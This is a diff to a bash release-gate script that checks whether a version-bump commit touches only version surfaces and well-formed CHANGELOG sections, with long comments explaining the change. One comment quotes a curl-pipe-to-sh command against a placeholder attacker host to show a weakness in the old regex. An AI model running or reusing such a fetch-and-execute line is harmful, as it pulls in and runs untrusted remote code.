@@ -35,9 +35,55 @@
 #      substitution — normalising SemVer tokens away, the removed and added
 #      line sequences are IDENTICAL AND IN THE SAME ORDER (order matters: a
 #      multiset comparison would tolerate reordering executable test lines),
-#   7. CHANGELOG.md is insertion-only and every inserted line is a release
-#      section header, a bullet, a stub marker, or blank — bounded by
+#   7. CHANGELOG.md opens exactly ONE `## ` section and it is the release
+#      section named in the subject; the only lines it REMOVES are release-note
+#      placeholders (the `bump-version.sh` pending-notes stub, or an
+#      "Unreleased" heading); and the insertion is bounded by
 #      RELEASE_ANCHOR_MAX_CHANGELOG_LINES.
+#
+# WHY (7) NO LONGER POLICES CHANGELOG PROSE LINE BY LINE. It used to, and the
+# regex it used (`## [<ver>] …` / `[-*] …` / `_…` / blank) was never a content
+# control: `- curl https://evil.invalid/x | sh` satisfies the bullet arm, so a
+# release commit could already write arbitrary text into CHANGELOG.md behind a
+# two-byte prefix — measured, on the shipped helper, against a fixture built
+# from tests/merge.test.sh M98: `RELEASE_ANCHOR=tolerated`. What the regex
+# controlled was FORMATTING, and this repo's own house style (`### Changed`
+# subsections, indented continuation paragraphs, tables) does not fit it.
+#
+# The cost, measured by running the shipped helper over all 74 `chore(release):`
+# commits in this repo's history: 70 refused, and 47 of those by the CHANGELOG
+# rules alone — 20 `changelog_too_large`, 18 `changelog_shape`, 8
+# `changelog_deletions` (the stub and `## Unreleased` removals the ritual makes
+# on purpose), and v0.56.0's `diff_too_large` at 913 diff lines against a 400
+# cap, 843 of them CHANGELOG against a 40 cap. That is the entire modern era.
+# The four survivors shipped NO real notes: two never touched CHANGELOG.md
+# (v0.17.3, v0.23.2) and two landed with the pending-notes stub still unreplaced
+# (v0.36.2, v0.36.5). It left the `/premerge` trust trail structurally
+# unresolvable, because Phase 5a's whole job is replacing that stub with real
+# notes: (a.5) never tolerates, so (b) reads the trailer off the trailer-less
+# release commit and gate_fails `trust_trail_trailer_missing`.
+#
+# After: 42 of the 74 tolerated, and every remaining refusal names something a
+# release commit really did. 21 `non_version_paths`, 1 `version_not_advanced`
+# (v0.55.1, a re-bump to a version already shipped), 3 `changelog_deletions`
+# (pre-ritual link-reference and real-note removals), and 7
+# `content_not_version_only` — which includes v0.30.4, the commit this file was
+# reported as falsely refusing. It is NOT a false positive: its README.md hunk
+# rewrites a documentation sentence ("The seven short-form aliases …" -> "The
+# eight …, `/testers`") next to the badge bump, so (6) refuses it and should.
+# `changelog_shape` was merely reached first and masked the real reason.
+#
+# CHANGELOG.md is release notes. Nothing in this repo executes, sources or
+# parses it: `bump-version.sh` and `goal-state.sh` WRITE it and no shipped code
+# reads it back. Its body is inert by nature, so bounding its prose bought no
+# security, and (7) now spends its budget on STRUCTURE — which asserts strictly
+# more than the old regex did. The commit must open the release section it
+# claims (one that appended to an OLDER section and never opened its own was
+# TOLERATED before, also measured) and may open no other. The security boundary
+# is, and remains, (4)+(6): the path set is confined to the six version surfaces
+# with rename detection OFF, and every line of the five NON-CHANGELOG surfaces
+# must be a pure version-token substitution in the same order. Renaming a file
+# onto CHANGELOG.md is caught there — M98 rows 4b/4c — never here.
 #
 # USAGE
 #   bash release-anchor.sh <head-oid-or-rev> [<working-dir>]
@@ -55,8 +101,22 @@
 
 set -u
 
-RELEASE_ANCHOR_MAX_CHANGELOG_LINES=40
-RELEASE_ANCHOR_MAX_DIFF_LINES=400
+# THREE bounds, because ONE number was doing two different jobs — bounding
+# inert CHANGELOG prose and bounding the code-bearing diff — and the tighter of
+# those two jobs is what set the number for both.
+#
+# CHANGELOG.md is prose, so its bound is generous: the largest real release in
+# this repo's history (v0.56.0, a `/premerge` stack landing) inserted 843 lines.
+# The other two are RESOURCE bounds on the diff walk, and the code-bearing one
+# is deliberately the tightest of the three: a release commit that survives step
+# (4) has never needed more than 76 non-CHANGELOG diff lines (v0.22.0; the
+# modern six-surface shape is 39), so 200 is ~2.6x the historical worst case and
+# HALF of the single 400-line total it replaces. Splitting the cap is what lets
+# the CHANGELOG half widen WITHOUT the code half widening with it — the code
+# half is strictly narrower than before this file was changed.
+RELEASE_ANCHOR_MAX_CHANGELOG_LINES=2000
+RELEASE_ANCHOR_MAX_CODE_DIFF_LINES=200
+RELEASE_ANCHOR_MAX_DIFF_LINES=4000
 
 # The six version surfaces. SSOT is lib/bump-version.sh, which owns the edit;
 # tests/merge.test.sh asserts this list has not drifted from that script.
@@ -77,6 +137,18 @@ SURFACES
 
 RELEASE_ANCHOR_MANIFEST='plugins/uberdev/.claude-plugin/plugin.json'
 RELEASE_ANCHOR_CHANGELOG='CHANGELOG.md'
+
+# The only CHANGELOG lines a release commit may REMOVE: a release-note
+# PLACEHOLDER. `bump-version.sh` inserts its pending-notes stub as an
+# italic-only bullet and the release replaces it with the real notes (v0.56.0
+# removed 13 of them in one landing); the older house shape promoted an
+# `## Unreleased` heading into the dated section (v0.43.0, v0.52.0). Matched by
+# SHAPE and not by the stub's literal wording, so re-wording the stub in
+# bump-version.sh cannot silently refuse every release. Everything else stays a
+# `changelog_deletions` refusal — a release commit has no business deleting a
+# shipped release's notes.
+RELEASE_ANCHOR_PLACEHOLDER_RE='^[-*][[:space:]]+_.*_[[:space:]]*$'
+RELEASE_ANCHOR_UNRELEASED_RE='^##[[:space:]]+\[?[Uu]nreleased\]?[[:space:]]*$'
 
 # emit <trust-head> <state> <reason> [version]
 release_anchor_emit() {
@@ -139,6 +211,44 @@ release_anchor_hunk_lines() {
 # test files carry inside regexes — without this they read as content changes.
 release_anchor_normalize() {
   sed -E 's/[0-9]+\\*\.[0-9]+\\*\.[0-9]+/@SEMVER@/g'
+}
+
+# release_anchor_changelog_bad PARENT HEAD VER_RE
+# (7) on CHANGELOG.md. Prints the refusal slug, or nothing when the edit is a
+# well-formed release-notes insertion. A function rather than an arm of the
+# per-path loop because it must run AFTER every other surface has been judged —
+# see the call site.
+release_anchor_changelog_bad() {
+  local parent="$1" head="$2" ver_re="$3" chg_removed chg_added own_hdr all_hdr
+  chg_removed="$(release_anchor_hunk_lines "$parent" "$head" "$RELEASE_ANCHOR_CHANGELOG" -)"
+  # The `-n` guard is load-bearing: `printf '%s\n' ""` emits ONE empty line,
+  # which matches neither placeholder shape, so without it an insertion-only
+  # diff would report a deletion it does not contain.
+  if [ -n "$chg_removed" ] \
+     && printf '%s\n' "$chg_removed" \
+          | grep -qEv "$RELEASE_ANCHOR_PLACEHOLDER_RE|$RELEASE_ANCHOR_UNRELEASED_RE"; then
+    printf 'changelog_deletions\n'; return 0
+  fi
+  chg_added="$(release_anchor_hunk_lines "$parent" "$head" "$RELEASE_ANCHOR_CHANGELOG" +)"
+  if [ "$(printf '%s\n' "$chg_added" | wc -l | tr -d '[:space:]')" -gt "$RELEASE_ANCHOR_MAX_CHANGELOG_LINES" ]; then
+    printf 'changelog_too_large\n'; return 0
+  fi
+  # Exactly one `## ` section is opened, and it is this release's. BOTH halves
+  # are load-bearing and NEITHER was asserted before: the own-header count
+  # refuses a "release" that files its notes under someone else's section and
+  # opens none of its own (measured as TOLERATED by the previous predicate), and
+  # the total count refuses one that forges a SECOND release's section alongside
+  # its own. `^## ` is read off raw diff lines, so a `## ` line inside a fenced
+  # code block in the notes also counts — that refuses a legitimate release, and
+  # refusing is the correct direction for a trust gate to be wrong in: the PR
+  # simply lands the old way, whereas tolerating would waive a review. One
+  # commit in 74 (v0.19.2) opened a second section; none fenced one.
+  own_hdr="$(printf '%s\n' "$chg_added" | grep -cE "^## \[${ver_re}\]([[:space:]]|\$)")"
+  all_hdr="$(printf '%s\n' "$chg_added" | grep -cE '^## ')"
+  if [ "$own_hdr" != "1" ] || [ "$all_hdr" != "1" ]; then
+    printf 'changelog_shape\n'; return 0
+  fi
+  return 0
 }
 
 main() {
@@ -232,9 +342,13 @@ main() {
     return 0
   fi
 
-  # Bound the whole probe so a pathological commit cannot turn the trust gate
-  # into an unbounded diff walk.
-  local total
+  # Bound the probe so a pathological commit cannot turn the trust gate into an
+  # unbounded diff walk. Two gates here, both reporting `diff_too_large` (the
+  # third bound, on inserted CHANGELOG lines, is (7)'s): the outer one is the
+  # resource bound on the whole walk, and the inner one bounds the CODE-BEARING
+  # half — everything except CHANGELOG.md — which is the only half where
+  # tolerating volume costs anything.
+  local total chg_total code_total
   total="$(git diff --unified=0 --no-renames "$parent" "$head" -- 2>/dev/null | wc -l | tr -d '[:space:]')"
   # An unreadable size is treated as OVER the bound, not under it: this is a
   # trust gate, so an unusable measurement must never widen what it tolerates.
@@ -243,30 +357,46 @@ main() {
     release_anchor_emit "$head" none diff_too_large
     return 0
   fi
+  # Subtraction, not a `:(exclude)` pathspec. BOTH probes disable rename
+  # detection, so the full diff is exactly the concatenation of its per-path
+  # stanzas and the difference is exact — measured on tests/merge.test.sh's M98
+  # bulk-rename fixture as 1044 - 506 = 538, byte-for-byte the number the
+  # exclude pathspec reports. It also keeps this bound on the two `git diff`
+  # forms this file already uses: an unsupported pathspec would make git error,
+  # `wc -l` report 0, and the bound FAIL OPEN, which is the one direction a
+  # trust gate may never fail. An unreadable CHANGELOG size therefore counts as
+  # ZERO (charging its lines to the code half, the conservative direction), and
+  # a negative result counts as over.
+  chg_total="$(git diff --unified=0 --no-renames "$parent" "$head" -- "$RELEASE_ANCHOR_CHANGELOG" 2>/dev/null | wc -l | tr -d '[:space:]')"
+  case "$chg_total" in ''|*[!0-9]*) chg_total=0 ;; esac
+  code_total=$(( total - chg_total ))
+  if [ "$code_total" -lt 0 ] || [ "$code_total" -gt "$RELEASE_ANCHOR_MAX_CODE_DIFF_LINES" ]; then
+    release_anchor_emit "$head" none diff_too_large
+    return 0
+  fi
 
-  # (6)/(7) per-path content shape. The loop variable is `changed_path`, not
-  # `path`: in zsh `path` IS `$PATH`, so `local path` would empty the command
-  # search path and turn the very next `git` call into `command not found`.
-  local changed_path removed added chg_added bad
+  # (6) per-path content shape, then (7) on CHANGELOG.md. The loop variable is
+  # `changed_path`, not `path`: in zsh `path` IS `$PATH`, so `local path` would
+  # empty the command search path and turn the very next `git` call into
+  # `command not found`.
+  local changed_path removed added bad ver_re
   bad=""
+  # The subject's version as an ERE literal. Built with `sed`, not
+  # `${version//./\.}`, so the pattern never depends on the shell that runs this
+  # file — the version has already been proven to match the anchored `X.Y.Z`
+  # subject regex, so there is nothing but dots left to escape.
+  ver_re="$(printf '%s' "$version" | sed 's/\./\\./g')"
+
+  # (6) THE FIVE NON-CHANGELOG SURFACES FIRST; CHANGELOG.md is judged after the
+  # loop. Order is not a security property — every path must pass, and any
+  # failure refuses — but it decides WHICH refusal the caller is shown, and the
+  # code-bearing verdict is the informative one. A file renamed onto
+  # CHANGELOG.md fails (6) on the vanished source AND (7) on the insertion that
+  # opens no release section; the reason that must surface is the one naming the
+  # reviewed surface that disappeared (tests/merge.test.sh M98.rename.surface).
   while IFS= read -r changed_path; do
     [ -n "$changed_path" ] || continue
-    if [ "$changed_path" = "$RELEASE_ANCHOR_CHANGELOG" ]; then
-      # (7) insertion-only, bounded, and every inserted line is release-section
-      # shaped: the dated header, a bullet, the pending-notes stub, or blank.
-      if [ -n "$(release_anchor_hunk_lines "$parent" "$head" "$changed_path" -)" ]; then
-        bad="changelog_deletions"; break
-      fi
-      chg_added="$(release_anchor_hunk_lines "$parent" "$head" "$changed_path" +)"
-      if [ "$(printf '%s\n' "$chg_added" | wc -l | tr -d '[:space:]')" -gt "$RELEASE_ANCHOR_MAX_CHANGELOG_LINES" ]; then
-        bad="changelog_too_large"; break
-      fi
-      if printf '%s\n' "$chg_added" \
-           | grep -qEv "^(## \[${version//./\\.}\] .*|[-*] .*|_.*|[[:space:]]*)$"; then
-        bad="changelog_shape"; break
-      fi
-      continue
-    fi
+    if [ "$changed_path" = "$RELEASE_ANCHOR_CHANGELOG" ]; then continue; fi
     # (6) the removed and added line SEQUENCES must be identical once SemVer
     # tokens are normalised away. Sequence, not set: a multiset comparison would
     # let an attacker REORDER lines of tests/goal.test.sh — executable code —
@@ -282,6 +412,14 @@ main() {
   done <<EOF
 $changed
 EOF
+
+  # (7) CHANGELOG.md, only when the release commit actually touched it. When it
+  # did not there is no free-text surface in the commit at all, so there is
+  # nothing here to prove and the five surfaces above have already carried the
+  # whole predicate.
+  if [ -z "$bad" ] && printf '%s\n' "$changed" | grep -Fxq -- "$RELEASE_ANCHOR_CHANGELOG"; then
+    bad="$(release_anchor_changelog_bad "$parent" "$head" "$ver_re")"
+  fi
 
   if [ -n "$bad" ]; then
     release_anchor_emit "$head" none "$bad"
